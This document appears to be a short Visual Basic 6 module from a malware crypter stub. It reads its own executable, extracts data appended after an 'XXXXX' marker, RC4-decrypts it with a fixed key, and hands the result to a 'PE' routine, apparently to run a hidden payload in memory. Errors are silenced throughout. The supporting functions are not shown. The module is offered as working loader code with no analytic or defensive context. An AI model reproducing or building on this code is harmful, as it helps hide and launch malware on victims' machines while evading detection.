Attribute VB_Name = "mMain"

Private Sub Main()
On Error Resume Next

Static Control As String
Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
Control = Input(LOF(1), 1)
Close #1

Control = Mid(Control, InStr(Control, "XXXXX") + 5, Len(Control))
Control = RC4_String(Control, "AAAAA")
PE App.Path + "\" + App.EXEName, STRING_TO_BYTES(Control)
End Sub
